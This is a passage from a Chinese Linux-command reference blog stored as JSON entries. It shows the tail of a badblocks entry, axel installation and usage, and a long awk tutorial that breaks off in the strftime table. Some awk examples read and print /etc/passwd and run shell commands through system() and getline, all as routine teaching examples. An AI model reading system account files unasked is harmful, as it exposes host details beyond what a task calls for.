在创建文件系统前检查坏道的硬盘。 这个操作已经很清楚地告知我们可以采用mkfs.ext3 -c选项用read-only方式检查硬盘。这个命令会在格式化硬盘时检查硬盘，并标出错误的硬盘“block”。用这个方法格式化硬盘，需要有相当大的耐心，因为命令运行后，会一个个用读的方式检查硬盘。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"badblocks","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/badblocks/","stats":{"text":"3 min read","time":173000,"words":771,"minutes":3},"date":"2022-01-30 18:45:42","dateFormat":"2022-01-30"},{"content":"多线程下载工具。 补充说明 axel 是 Linux 下一个不错的 HTTP/ftp 高速下载工具。支持多线程下载、断点续传，且可以从多个地址或者从一个地址的多个连接来下载同一个文件。适合网速不给力时多线程下载提高下载速度。比如在国内 VPS 或服务器上下载 lnmp 一键安装包用 Axel 就比 wget 快。 安装 CentOS 安装 Axel： 目前 yum 源上没有 Axel，我们可以到 http://pkgs.repoforge.org/axel/ 下载 rpm 包安装。 32 位 CentOS 执行下面命令： wget -c http://pkgs.repoforge.org/axel/axel-2.4-1.el5.rf.i386.rpm rpm -ivh axel-2.4-1.el5.rf.i386.rpm 64 位 CentOS 执行下面命令： wget -c http://pkgs.repoforge.org/axel/axel-2.4-1.el5.rf.x86_64.rpm rpm -ivh axel-2.4-1.el5.rf.x86_64.rpm Debian/Ubuntu 安装 Axel： apt-get install axel 语法 axel [options] url1 [url2] [url...] 选项 --max-speed=x , -s x # 最高速度x --num-connections=x , -n x # 连接数x --output=f , -o f # 下载为本地文件f --search[=x] , -S [x] # 搜索镜像 --header=x , -H x # 添加头文件字符串x（指定 HTTP header） --user-agent=x , -U x # 设置用户代理（指定 HTTP user agent） --no-proxy ， -N # 不使用代理服务器 --quiet ， -q # 静默模式 --verbose ，-v # 更多状态信息 --alternate ， -a # Alternate progress indicator --help ，-h # 帮助 --version ，-V # 版本信息 实例 如下载 lnmp 安装包指定 10 个线程，存到 /tmp/： axel -n 10 -o /tmp/ http://example.com/lnmp.tar.gz 如果下载过程中下载中断可以再执行下载命令即可恢复上次的下载进度。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"axel","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/axel/","stats":{"text":"2 min read","time":106000,"words":399,"minutes":2},"date":"2022-01-30 18:40:43","dateFormat":"2022-01-30"},{"content":"文本和数据进行处理的编程语言。 补充说明 awk 是一种编程语言，用于在 linux/unix 下对文本和数据进行处理。数据可以来自标准输入（stdin）、一个或多个文件，或其它命令的输出。它支持用户自定义函数和动态正则表达式等先进功能，是 linux/unix 下的一个强大编程工具。它在命令行中使用，但更多是作为脚本来使用。awk 有很多内建的功能，比如数组、函数等，这是它和C语言的相同之处，灵活性是 awk 最大的优势。 awk命令格式和选项 语法形式 awk [options] 'script' var=value file(s) awk [options] -f scriptfile var=value file(s) 常用命令选项 -F fs fs指定输入分隔符，fs可以是字符串或正则表达式，如-F: -v var=value 赋值一个用户定义变量，将外部变量传递给awk -f scripfile 从脚本文件中读取awk命令 -m[fr] val 对val值设置内在限制，-mf选项限制分配给val的最大块数目；-mr选项限制记录的最大数目。这两个功能是Bell实验室版awk的扩展功能，在标准awk中不适用。 awk模式和操作 awk 脚本是由模式和操作组成的。 模式 模式可以是以下任意一个： /正则表达式/：使用通配符的扩展集。 关系表达式：使用运算符进行操作，可以是字符串或数字的比较测试。 模式匹配表达式：用运算符~（匹配）和!~（不匹配）。 BEGIN 语句块、pattern 语句块、END 语句块：参见 awk 的工作原理 操作 操作由一个或多个命令、函数、表达式组成，之间由换行符或分号隔开，并位于大括号内，主要部分是： 变量或数组赋值 输出命令 内置函数 控制流语句 awk 脚本基本结构 awk 'BEGIN{ print &quot;start&quot; } pattern{ commands } END{ print &quot;end&quot; }' file 一个 awk 脚本通常由：BEGIN 语句块、能够使用模式匹配的通用语句块、END 语句块 3 部分组成，这三个部分是可选的。任意一个部分都可以不出现在脚本中，脚本通常是被单引号或双引号中，例如： awk 'BEGIN{ i=0 } { i++ } END{ print i }' filename awk &quot;BEGIN{ i=0 } { i++ } END{ print i }&quot; filename awk 的工作原理 awk 'BEGIN{ commands } pattern{ commands } END{ commands }' 执行BEGIN{ commands }语句块中的语句； 从文件或标准输入（stdin）读取一行，然后执行pattern{ commands }语句块，它逐行扫描文件，从第一行到最后一行重复这个过程，直到文件全部被读取完毕。 当读至输入流末尾时，执行END{ commands }语句块。 BEGIN语句块 在 awk 开始从输入流中读取行之前被执行，这是一个可选的语句块，比如变量初始化、打印输出表格的表头等语句通常可以写在 BEGIN 语句块中。 END语句块 在 awk 从输入流中读取完所有的行之后即被执行，比如打印所有行的分析结果这类信息汇总都是在 END 语句块中完成，它也是一个可选语句块。 pattern语句块 中的通用命令是最重要的部分，它也是可选的。如果没有提供 pattern 语句块，则默认执行{ print }，即打印每一个读取到的行，awk 读取的每一行都会执行该语句块。 示例 echo -e &quot;A line 1\\nA line 2&quot; | awk 'BEGIN{ print &quot;Start&quot; } { print } END{ print &quot;End&quot; }' Start A line 1 A line 2 End 当使用不带参数的print时，它就打印当前行，当print的参数是以逗号进行分隔时，打印时则以空格作为定界符。在 awk 的 print 语句块中双引号是被当作拼接符使用，例如： echo | awk '{ var1=&quot;v1&quot;; var2=&quot;v2&quot;; var3=&quot;v3&quot;; print var1,var2,var3; }' v1 v2 v3 双引号拼接使用： echo | awk '{ var1=&quot;v1&quot;; var2=&quot;v2&quot;; var3=&quot;v3&quot;; print var1&quot;=&quot;var2&quot;=&quot;var3; }' v1=v2=v3 {} 类似一个循环体，会对文件中的每一行进行迭代，通常变量初始化语句（如：i=0）以及打印文件头部的语句放入 BEGIN语 句块中，将打印的结果等语句放在 END 语句块中。 awk内置变量（预定义变量） 说明：[A][N][P][G]表示第一个支持变量的工具，[A]=awk、[N]=nawk、[P]=POSIXawk、[G]=gawk **$n** 当前记录的第n个字段，比如n为1表示第一个字段，n为2表示第二个字段。 **$0** 这个变量包含执行过程中当前行的文本内容。 [N] **ARGC** 命令行参数的数目。 [G] **ARGIND** 命令行中当前文件的位置（从0开始算）。 [N] **ARGV** 包含命令行参数的数组。 [G] **CONVFMT** 数字转换格式（默认值为%.6g）。 [P] **ENVIRON** 环境变量关联数组。 [N] **ERRNO** 最后一个系统错误的描述。 [G] **FIELDWIDTHS** 字段宽度列表（用空格键分隔）。 [A] **FILENAME** 当前输入文件的名。 [P] **FNR** 同NR，但相对于当前文件。 [A] **FS** 字段分隔符（默认是任何空格）。 [G] **IGNORECASE** 如果为真，则进行忽略大小写的匹配。 [A] **NF** 表示字段数，在执行过程中对应于当前的字段数。 [A] **NR** 表示记录数，在执行过程中对应于当前的行号。 [A] **OFMT** 数字的输出格式（默认值是%.6g）。 [A] **OFS** 输出字段分隔符（默认值是一个空格）。 [A] **ORS** 输出记录分隔符（默认值是一个换行符）。 [A] **RS** 记录分隔符（默认是一个换行符）。 [N] **RSTART** 由match函数所匹配的字符串的第一个位置。 [N] **RLENGTH** 由match函数所匹配的字符串的长度。 [N] **SUBSEP** 数组下标分隔符（默认值是34）。 示例 echo -e &quot;line1 f2 f3\\nline2 f4 f5\\nline3 f6 f7&quot; | awk '{print &quot;Line No:&quot;NR&quot;, No of fields:&quot;NF, &quot;$0=&quot;$0, &quot;$1=&quot;$1, &quot;$2=&quot;$2, &quot;$3=&quot;$3}' Line No:1, No of fields:3 $0=line1 f2 f3 $1=line1 $2=f2 $3=f3 Line No:2, No of fields:3 $0=line2 f4 f5 $1=line2 $2=f4 $3=f5 Line No:3, No of fields:3 $0=line3 f6 f7 $1=line3 $2=f6 $3=f7 使用print $NF可以打印出一行中的最后一个字段，使用$(NF-1)则是打印倒数第二个字段，其他以此类推： echo -e &quot;line1 f2 f3\\n line2 f4 f5&quot; | awk '{print $NF}' f3 f5 echo -e &quot;line1 f2 f3\\n line2 f4 f5&quot; | awk '{print $(NF-1)}' f2 f4 打印每一行的第二和第三个字段： awk '{ print $2,$3 }' filename 统计文件中的行数： awk 'END{ print NR }' filename 以上命令只使用了 END 语句块，在读入每一行的时，awk 会将 NR 更新为对应的行号，当到达最后一行 NR 的值就是最后一行的行号，所以 END 语句块中的 NR 就是文件的行数。 一个每一行中第一个字段值累加的例子： seq 5 | awk 'BEGIN{ sum=0; print &quot;总和：&quot; } { print $1&quot;+&quot;; sum+=$1 } END{ print &quot;等于&quot;; print sum }' 总和： 1+ 2+ 3+ 4+ 5+ 等于 15 将外部变量值传递给awk 借助 -v 选项 ，可以将外部值（并非来自 stdin）传递给 awk： VAR=10000 echo | awk -v VARIABLE=$VAR '{ print VARIABLE }' 另一种传递外部变量方法： var1=&quot;aaa&quot; var2=&quot;bbb&quot; echo | awk '{ print v1,v2 }' v1=$var1 v2=$var2 当输入来自于文件时使用： awk '{ print v1,v2 }' v1=$var1 v2=$var2 filename 以上方法中，变量之间用空格分隔作为 awk 的命令行参数跟随在 BEGIN、{} 和 END 语句块之后。 查找进程 pid netstat -antup | grep 7770 | awk '{ print $NF NR}' | awk '{ print $1}' awk 运算与判断 作为一种程序设计语言所应具有的特点之一，awk 支持多种运算，这些运算与C语言提供的基本相同。awk 还提供了一系列内置的运算函数（如 log、sqr、cos、sin 等）和一些用于对字符串进行操作（运算）的函数（如 length、substr 等等）。这些函数的引用大大的提高了 awk 的运算功能。作为对条件转移指令的一部分，关系判断是每种程序设计语言都具备的功能，awk 也不例外，awk 中允许进行多种测试，作为样式匹配，还提供了模式匹配表达式（匹配）和 !（不匹配）。作为对测试的一种扩充，awk 也支持用逻辑运算符。 算术运算符 运算符 描述 + - 加，减 * / &amp; 乘，除与求余 + - ! 一元加，减和逻辑非 ^ *** 求幂 ++ -- 增加或减少，作为前缀或后缀 例： awk 'BEGIN{a=&quot;b&quot;;print a++,++a;}' 0 2 注意：所有用作算术运算符进行操作，操作数自动转为数值，所有非数值都变为0 赋值运算符 运算符 描述 = += -= = /= %= ^= *= 赋值语句 例： a+=5; 等价于：a=a+5; 其它同类 逻辑运算符 运算符 描述 || 逻辑或 &amp;&amp; 逻辑与 例： awk 'BEGIN{a=1;b=2;print (a&gt;5 &amp;&amp; b&lt;=2),(a&gt;5 || b&lt;=2);}' 0 1 正则运算符 运算符 描述 ~ !~ 匹配正则表达式和不匹配正则表达式 例： awk 'BEGIN{a=&quot;100testa&quot;;if(a ~ /^100*/){print &quot;ok&quot;;}}' ok 关系运算符 运算符 描述 &lt; &lt;= &gt; &gt;= != == 关系运算符 例： awk 'BEGIN{a=11;if(a &gt;= 9){print &quot;ok&quot;;}}' ok 注意：&gt; &lt; 可以作为字符串比较，也可以用作数值比较，关键看操作数如果是字符串就会转换为字符串比较。两个都为数字才转为数值比较。字符串比较：按照ASCII码顺序比较。 其它运算符 运算符 描述 $ 字段引用 空格 字符串连接符 ?: C条件表达式 in 数组中是否存在某键值 例： awk 'BEGIN{a=&quot;b&quot;;print a==&quot;b&quot;?&quot;ok&quot;:&quot;err&quot;;}' ok awk 'BEGIN{a=&quot;b&quot;;arr[0]=&quot;b&quot;;arr[1]=&quot;c&quot;;print (a in arr);}' 0 awk 'BEGIN{a=&quot;b&quot;;arr[0]=&quot;b&quot;;arr[&quot;b&quot;]=&quot;c&quot;;print (a in arr);}' 1 运算级优先级表 ! 级别越高越优先 级别越高越优先 awk 高级输入输出 读取下一条记录 awk 中 next 语句使用：在循环逐行匹配，如果遇到 next，就会跳过当前行，直接忽略下面语句。而进行下一行匹配。next 语句一般用于多行合并： cat text.txt a b c d e awk 'NR%2==1{next}{print NR,$0;}' text.txt 2 b 4 d 当记录行号除以 2 余 1，就跳过当前行。下面的print NR,$0也不会执行。下一行开始，程序有开始判断NR%2值。这个时候记录行号是：2 ，就会执行下面语句块：'print NR,$0' 分析发现需要将包含有&quot;web&quot;行进行跳过，然后需要将内容与下面行合并为一行： cat text.txt web01[192.168.2.100] httpd ok tomcat ok sendmail ok web02[192.168.2.101] httpd ok postfix ok web03[192.168.2.102] mysqld ok httpd ok 0 awk '/^web/{T=$0;next;}{print T&quot;:t&quot;$0;}' test.txt web01[192.168.2.100]: httpd ok web01[192.168.2.100]: tomcat ok web01[192.168.2.100]: sendmail ok web02[192.168.2.101]: httpd ok web02[192.168.2.101]: postfix ok web03[192.168.2.102]: mysqld ok web03[192.168.2.102]: httpd ok 简单地读取一条记录 awk getline用法：输出重定向需用到getline函数。getline 从标准输入、管道或者当前正在处理的文件之外的其他输入文件获得输入。它负责从输入获得下一行的内容，并给 NF, NR 和 FNR 等内建变量赋值。如果得到一条记录，getline 函数返回 1，如果到达文件的末尾就返回 0，如果出现错误，例如打开文件失败，就返回 -1。 getline 语法：getline var，变量 var 包含了特定行的内容。 awk getline 从整体上来说，用法说明： 当其左右无重定向符|或&lt;时： getline作用于当前文件，读入当前文件的第一行给其后跟的变量var或$0（无变量），应该注意到，由于awk在处理getline之前已经读入了一行，所以getline得到的返回结果是隔行的。 当其左右有重定向符|或&lt;时： getline则作用于定向输入文件，由于该文件是刚打开，并没有被awk读入一行，只是getline读入，那么getline返回的是该文件的第一行，而不是隔行。 示例： 执行 linux 的 date命令，并通过管道输出给getline，然后再把输出赋值给自定义变量 out，并打印它： awk 'BEGIN{ &quot;date&quot; | getline out; print out }' test 执行 shell 的 date 命令，并通过管道输出给 getline，然后 getline 从管道中读取并将输入赋值给out，split 函数把变量 out 转化成数组 mon，然后打印数组 mon 的第二个元素： awk 'BEGIN{ &quot;date&quot; | getline out; split(out,mon); print mon[2] }' test 命令 ls 的输出传递给 geline 作为输入，循环使 getline 从 ls 的输出中读取一行，并把它打印到屏幕。这里没有输入文件，因为 BEGIN 块在打开输入文件前执行，所以可以忽略输入文件。 awk 'BEGIN{ while( &quot;ls&quot; | getline) print }' 关闭文件 awk 中允许在程序中关闭一个输入或输出文件，方法是使用 awk 的 close 语句。 close(&quot;filename&quot;) filename 可以是 getline 打开的文件，也可以是 stdin，包含文件名的变量或者 getline 使用的确切命令。或一个输出文件，可以是 stdout，包含文件名的变量或使用管道的确切命令。 输出到一个文件 awk 中允许用如下方式将结果输出到一个文件： echo | awk '{printf(&quot;hello word!n&quot;) &gt; &quot;datafile&quot;}' # 或 echo | awk '{printf(&quot;hello word!n&quot;) &gt;&gt; &quot;datafile&quot;}' 设置字段定界符 默认的字段定界符是空格，可以使用-F &quot;定界符&quot;明确指定一个定界符： awk -F: '{ print $NF }' /etc/passwd # 或 awk 'BEGIN{ FS=&quot;:&quot; } { print $NF }' /etc/passwd 在 BEGIN语句块 中则可以用 OFS=&quot;定界符&quot; 设置输出字段的定界符。 流程控制语句 在 linux awk 的 while、do-while 和 for 语句中允许使用 break, continue 语句来控制流程走向，也允许使用 exit 这样的语句来退出。break 中断当前正在执行的循环并跳到循环外执行下一条语句。if 是流程选择用法。awk 中，流程控制语句，语法结构，与C语言类型。有了这些语句，其实很多 shell 程序都可以交给 awk，而且性能是非常快的。下面是各个语句用法。 条件判断语句 if(表达式) 语句1 else 语句2 格式中语句 1 可以是多个语句，为了方便判断和阅读，最好将多个语句用 {} 括起来。awk 分枝结构允许嵌套，其格式为： if(表达式) {语句1} else if(表达式) {语句2} else {语句3} 示例： awk 'BEGIN{ test=100; if(test&gt;90){ print &quot;very good&quot;; } else if(test&gt;60){ print &quot;good&quot;; } else{ print &quot;no pass&quot;; } }' very good 每条命令语句后面可以用;分号结尾。 循环语句 while 语句 while(表达式) {语句} 示例： awk 'BEGIN{ test=100; total=0; while(i&lt;=test){ total+=i; i++; } print total; }' 5050 for 循环 for循环有两种格式： 格式1： for(变量 in 数组) {语句} 示例： awk 'BEGIN{ for(k in ENVIRON){ print k&quot;=&quot;ENVIRON[k]; } }' TERM=linux G_BROKEN_FILENAMES=1 SHLVL=1 pwd=/root/text ... logname=root HOME=/root SSH_CLIENT=192.168.1.21 53087 22 注：ENVIRON 是 awk 常量，是子典型数组。 格式2： for(变量;条件;表达式) {语句} 示例： awk 'BEGIN{ total=0; for(i=0;i&lt;=100;i++){ total+=i; } print total; }' 5050 do 循环 do {语句} while(条件) 例子： awk 'BEGIN{ total=0; i=0; do {total+=i;i++;} while(i&lt;=100) print total; }' 5050 其他语句 break 当 break 语句用于 while 或 for 语句时，导致退出程序循环。 continue 当 continue 语句用于 while 或 for 语句时，使程序循环移动到下一个迭代。 next 能能够导致读入下一个输入行，并返回到脚本的顶部。这可以避免对当前输入行执行其他的操作过程。 exit 语句使主输入循环退出并将控制转移到 END，如果 END 存在的话。如果没有定义 END 规则，或在 END 中应用 exit 语句，则终止脚本的执行。 数组应用 数组是 awk 的灵魂，处理文本中最不能少的就是它的数组处理。因为数组索引（下标）可以是数字和字符串在 awk 中数组叫做关联数组（associative arrays）。awk 中的数组不必提前声明，也不必声明大小。数组元素用 0 或空字符串来初始化，这根据上下文而定。 数组的定义 数字做数组索引（下标）： Array[1]=&quot;sun&quot; Array[2]=&quot;kai&quot; 字符串做数组索引（下标）： Array[&quot;first&quot;]=&quot;www&quot; Array&quot;[last&quot;]=&quot;name&quot; Array[&quot;birth&quot;]=&quot;1987&quot; 使用中print Array[1]会打印出 sun；使用print Array[2]会打印出 kai；使用print[&quot;birth&quot;]会得到 1987。 读取数组的值 { for(item in array) {print array[item]}; } #输出的顺序是随机的 { for(i=1;i&lt;=len;i++) {print array[i]}; } #Len是数组的长度 数组相关函数 得到数组长度： awk 'BEGIN{info=&quot;it is a test&quot;;lens=split(info,tA,&quot; &quot;);print length(tA),lens;}' 4 4 length返回字符串以及数组长度，split进行分割字符串为数组，也会返回分割得到数组长度。 awk 'BEGIN{info=&quot;it is a test&quot;;split(info,tA,&quot; &quot;);print asort(tA);}' 4 asort 对数组进行排序，返回数组长度。 输出数组内容（无序，有序输出）： awk 'BEGIN{info=&quot;it is a test&quot;;split(info,tA,&quot; &quot;);for(k in tA){print k,tA[k];}}' 4 test 1 it 2 is 3 a for...in输出，因为数组是关联数组，默认是无序的。所以通过for…in得到是无序的数组。如果需要得到有序数组，需要通过下标获得。 awk 'BEGIN{info=&quot;it is a test&quot;;tlen=split(info,tA,&quot; &quot;);for(k=1;k&lt;=tlen;k++){print k,tA[k];}}' 1 it 2 is 3 a 4 test 注意：数组下标是从 1 开始，与 C 数组不一样。 判断键值存在以及删除键值： # 错误的判断方法： awk 'BEGIN{tB[&quot;a&quot;]=&quot;a1&quot;;tB[&quot;b&quot;]=&quot;b1&quot;;if(tB[&quot;c&quot;]!=&quot;1&quot;){print &quot;no found&quot;;};for(k in tB){print k,tB[k];}}' no found a a1 b b1 c 以上出现奇怪问题，tB[&quot;c&quot;]没有定义，但是循环时候，发现已经存在该键值，它的值为空，这里需要注意，awk数组是关联数组，只要通过数组引用它的 key，就会自动创建改序列。 # 正确判断方法： awk 'BEGIN{tB[&quot;a&quot;]=&quot;a1&quot;;tB[&quot;b&quot;]=&quot;b1&quot;;if( &quot;c&quot; in tB){print &quot;ok&quot;;};for(k in tB){print k,tB[k];}}' a a1 b b1 if(key in array)通过这种方法判断数组中是否包含key键值。 #删除键值： awk 'BEGIN{tB[&quot;a&quot;]=&quot;a1&quot;;tB[&quot;b&quot;]=&quot;b1&quot;;delete tB[&quot;a&quot;];for(k in tB){print k,tB[k];}}' b b1 delete array[key]可以删除，对应数组key的，序列值。 二维、多维数组使用 awk 的多维数组在本质上是一维数组，更确切一点，awk在存储上并不支持多维数组。awk 提供了逻辑上模拟二维数组的访问方式。例如，array[2,4]=1这样的访问是允许的。awk 使用一个特殊的字符串SUBSEP(�34)作为分割字段，在上面的例子中，关联数组 array 存储的键值实际上是 2�344。 类似一维数组的成员测试，多维数组可以使用if ( (i,j) in array)这样的语法，但是下标必须放置在圆括号中。类似一维数组的循环访问，多维数组使用for ( item in array )这样的语法遍历数组。与一维数组不同的是，多维数组必须使用split()函数来访问单独的下标分量。 awk 'BEGIN{ for(i=1;i&lt;=9;i++){ for(j=1;j&lt;=9;j++){ tarr[i,j]=i*j; print i,&quot;*&quot;,j,&quot;=&quot;,tarr[i,j]; } } }' 1 * 1 = 1 1 * 2 = 2 1 * 3 = 3 1 * 4 = 4 1 * 5 = 5 1 * 6 = 6 ... 9 * 6 = 54 9 * 7 = 63 9 * 8 = 72 9 * 9 = 81 可以通过array[k,k2]引用获得数组内容。 另一种方法： awk 'BEGIN{ for(i=1;i&lt;=9;i++){ for(j=1;j&lt;=9;j++){ tarr[i,j]=i*j; } } for(m in tarr){ split(m,tarr2,SUBSEP); print tarr2[1],&quot;*&quot;,tarr2[2],&quot;=&quot;,tarr[m]; } }' 内置函数 awk 内置函数，主要分以下 3 种类似：算数函数、字符串函数、其它一般函数、时间函数。 算术函数 格式 描述 atan2( y, x ) 返回 y/x 的反正切。 cos( x ) 返回 x 的余弦；x 是弧度。 sin( x ) 返回 x 的正弦；x 是弧度。 exp( x ) 返回 x 幂函数。 log( x ) 返回 x 的自然对数。 sqrt( x ) 返回 x 平方根。 int( x ) 返回 x 的截断至整数的值。 rand( ) 返回任意数字 n，其中 0 &lt;= n &lt; 1。 srand( [expr] ) 将 rand 函数的种子值设置为 Expr 参数的值，或如果省略 Expr 参数则使用某天的时间。返回先前的种子值。 举例说明： awk 'BEGIN{OFMT=&quot;%.3f&quot;;fs=sin(1);fe=exp(10);fl=log(10);fi=int(3.1415);print fs,fe,fl,fi;}' 0.841 22026.466 2.303 3 OFMT 设置输出数据格式是保留 3 位小数。 获得随机数： awk 'BEGIN{srand();fr=int(100*rand());print fr;}' 78 awk 'BEGIN{srand();fr=int(100*rand());print fr;}' 31 awk 'BEGIN{srand();fr=int(100*rand());print fr;}' 41 字符串函数 格式 描述 gsub( Ere, Repl, [ In ] ) 除了正则表达式所有具体值被替代这点，它和 sub 函数完全一样地执行。 sub( Ere, Repl, [ In ] ) 用 Repl 参数指定的字符串替换 In 参数指定的字符串中的由 Ere 参数指定的扩展正则表达式的第一个具体值。sub 函数返回替换的数量。出现在 Repl 参数指定的字符串中的 &amp;（和符号）由 In 参数指定的与 Ere 参数的指定的扩展正则表达式匹配的字符串替换。如果未指定 In 参数，缺省值是整个记录（$0 记录变量）。 index( String1, String2 ) 在由 String1 参数指定的字符串（其中有出现 String2 指定的参数）中，返回位置，从 1 开始编号。如果 String2 参数不在 String1 参数中出现，则返回 0（零）。 length [(String)] 返回 String 参数指定的字符串的长度（字符形式）。如果未给出 String 参数，则返回整个记录的长度（$0 记录变量）。 blength [(String)] 返回 String 参数指定的字符串的长度（以字节为单位）。如果未给出 String 参数，则返回整个记录的长度（$0 记录变量）。 substr( String, M, [ N ] ) 返回具有 N 参数指定的字符数量子串。子串从 String 参数指定的字符串取得，其字符以 M 参数指定的位置开始。M 参数指定为将 String 参数中的第一个字符作为编号 1。如果未指定 N 参数，则子串的长度将是 M 参数指定的位置到 String 参数的末尾 的长度。 match( String, Ere ) 在 String 参数指定的字符串（Ere 参数指定的扩展正则表达式出现在其中）中返回位置（字符形式），从 1 开始编号，或如果 Ere 参数不出现，则返回 0（零）。RSTART 特殊变量设置为返回值。RLENGTH 特殊变量设置为匹配的字符串的长度，或如果未找到任何匹配，则设置为 -1（负一）。 split( String, A, [Ere] ) 将 String 参数指定的参数分割为数组元素 A[1], A[2], . . ., A[n]，并返回 n 变量的值。此分隔可以通过 Ere 参数指定的扩展正则表达式进行，或用当前字段分隔符（FS 特殊变量）来进行（如果没有给出 Ere 参数）。除非上下文指明特定的元素还应具有一个数字值，否则 A 数组中的元素用字符串值来创建。 tolower( String ) 返回 String 参数指定的字符串，字符串中每个大写字符将更改为小写。大写和小写的映射由当前语言环境的 LC_CTYPE 范畴定义。 toupper( String ) 返回 String 参数指定的字符串，字符串中每个小写字符将更改为大写。大写和小写的映射由当前语言环境的 LC_CTYPE 范畴定义。 sprintf(Format, Expr, Expr, . . . ) 根据 Format 参数指定的 printf 子例程格式字符串来格式化 Expr 参数指定的表达式并返回最后生成的字符串。 注：Ere 都可以是正则表达式。 gsub, sub 使用 awk 'BEGIN{info=&quot;this is a test2010test!&quot;;gsub(/[0-9]+/,&quot;!&quot;,info);print info}' this is a test!test! 在 info 中查找满足正则表达式，/[0-9]+/用&quot;&quot;替换，并且替换后的值，赋值给 info 未给 info 值，默认是$0 查找字符串（index 使用） awk 'BEGIN{info=&quot;this is a test2010test!&quot;;print index(info,&quot;test&quot;)?&quot;ok&quot;:&quot;no found&quot;;}' ok 未找到，返回 0 正则表达式匹配查找(match 使用） awk 'BEGIN{info=&quot;this is a test2010test!&quot;;print match(info,/[0-9]+/)?&quot;ok&quot;:&quot;no found&quot;;}' ok 截取字符串(substr 使用） [test@centos5 ~]$ awk 'BEGIN{info=&quot;this is a test2010test!&quot;;print substr(info,4,10);}' s is a tes 从第 4个 字符开始，截取10个长度字符串 字符串分割（split 使用） awk 'BEGIN{info=&quot;this is a test&quot;;split(info,tA,&quot; &quot;);print length(tA);for(k in tA){print k,tA[k];}}' 4 4 test 1 this 2 is 3 a 分割 info，动态创建数组 tA，这里比较有意思，awk for …in循环，是一个无序的循环。 并不是从数组下标 1…n，因此使用时候需要注意。 格式化字符串输出（sprintf 使用） 格式化字符串格式： 其中格式化字符串包括两部分内容：一部分是正常字符，这些字符将按原样输出; 另一部分是格式化规定字符，以&quot;%&quot;开始，后跟一个或几个规定字符,用来确定输出内容格式。 格式 描述 %d 十进制有符号整数 %f 浮点数 %c 单个字符 %e 指数形式的浮点数 %o 无符号以八进制表示的整数 %u 十进制无符号整数 %s 字符串 %p 指针的值 %x %X 无符号以十六进制表示的整数 %g 自动选择合适的表示法 awk 'BEGIN{n1=124.113;n2=-1.224;n3=1.2345; printf(&quot;%.2f,%.2u,%.2g,%X,%on&quot;,n1,n2,n3,n1,n1);}' 124.11,18446744073709551615,1.2,7C,174 一般函数 格式 描述 close( Expression ) 用同一个带字符串值的 Expression 参数来关闭由 print 或 printf 语句打开的或调用 getline 函数打开的文件或管道。如果文件或管道成功关闭，则返回 0；其它情况下返回非零值。如果打算写一个文件，并稍后在同一个程序中读取文件，则 close 语句是必需的。 system(command ) 执行 Command 参数指定的命令，并返回退出状态。等同于 system 子例程。 Expression | getline [ Variable ] 从来自 Expression 参数指定的命令的输出中通过管道传送的流中读取一个输入记录，并将该记录的值指定给 Variable 参数指定的变量。如果当前未打开将 Expression 参数的值作为其命令名称的流，则创建流。创建的流等同于调用 popen 子例程，此时 Command 参数取 Expression 参数的值且 Mode 参数设置为一个是 r 的值。只要流保留打开且 Expression 参数求得同一个字符串，则对 getline 函数的每次后续调用读取另一个记录。如果未指定 Variable 参数，则 $0 记录变量和 NF 特殊变量设置为从流读取的记录。 getline [ Variable ] &lt; Expression 从 Expression 参数指定的文件读取输入的下一个记录，并将 Variable 参数指定的变量设置为该记录的值。只要流保留打开且 Expression 参数对同一个字符串求值，则对 getline 函数的每次后续调用读取另一个记录。如果未指定 Variable 参数，则 $0 记录变量和 NF 特殊变量设置为从流读取的记录。 getline [ Variable ] 将 Variable 参数指定的变量设置为从当前输入文件读取的下一个输入记录。如果未指定 Variable 参数，则 $0 记录变量设置为该记录的值，还将设置 NF、NR 和 FNR 特殊变量。 打开外部文件（close 用法） awk 'BEGIN{while(&quot;cat /etc/passwd&quot;|getline){print $0;};close(&quot;/etc/passwd&quot;);}' root:x:0:0:root:/root:/bin/bash bin:x:1:1:bin:/bin:/sbin/nologin daemon:x:2:2:daemon:/sbin:/sbin/nologin 逐行读取外部文件（getline 使用方法） awk 'BEGIN{while(getline &lt; &quot;/etc/passwd&quot;){print $0;};close(&quot;/etc/passwd&quot;);}' root:x:0:0:root:/root:/bin/bash bin:x:1:1:bin:/bin:/sbin/nologin daemon:x:2:2:daemon:/sbin:/sbin/nologin awk 'BEGIN{print &quot;Enter your name:&quot;;getline name;print name;}' Enter your name: chengmo chengmo 调用外部应用程序（system使用方法） awk 'BEGIN{b=system(&quot;ls -al&quot;);print b;}' total 42092 drwxr-xr-x 14 chengmo chengmo 4096 09-30 17:47 . drwxr-xr-x 95 root root 4096 10-08 14:01 .. b 返回值，是执行结果。 时间函数 格式 描述 函数名 说明 mktime( YYYY MM dd HH MM ss[ DST]) 生成时间格式 strftime([format [, timestamp]]) 格式化时间输出，将时间戳转为时间字符串具体格式，见下表。 systime() 得到时间戳，返回从1970年1月1日开始到当前时间(不计闰年)的整秒数 建指定时间（mktime 使用） awk 'BEGIN{tstamp=mktime(&quot;2001 01 01 12 12 12&quot;);print strftime(&quot;%c&quot;,tstamp);}' 2001年01月01日 星期一 12时12分12秒 awk 'BEGIN{tstamp1=mktime(&quot;2001 01 01 12 12 12&quot;);tstamp2=mktime(&quot;2001 02 01 0 0 0&quot;);print tstamp2-tstamp1;}' 2634468 求 2 个时间段中间时间差，介绍了 strftime 使用方法 awk 'BEGIN{tstamp1=mktime(&quot;2001 01 01 12 12 12&quot;);tstamp2=systime();print tstamp2-tstamp1;}' 308201392 strftime 日期和时间格式说明符 格式 描述 %a 星期几的缩写(Sun) %A 星期几的完整写法(Sunday) %b 月名的缩写(Oct) %B 月名的完整写法(October) %c 本地日期和时间 %d 十进制日期 %D 日期 08/20/99 %e 日期，如果只有一位会补上一个空格 %H 用十进制表示24小时格式的小时 %I 用十进制表示12小时格式的小时 %j 从1月1日起一年中的第几天 %m 十进制表示的月份 %M 十进制表示的分钟 %p 12小时表示法(AM/PM) %S 十进制表示的秒 %U 十进制表示的一年中的第几个星期(星期天作为一个星期的开始) %w 十进制表示的星期几(星期天是0) %W 十进制表示的一年中的第几个星期(星期一作为一个星期的开始) %x 重新设置本地日期(08/20/99) %X 重新设置本地时间(12:00:00) %y 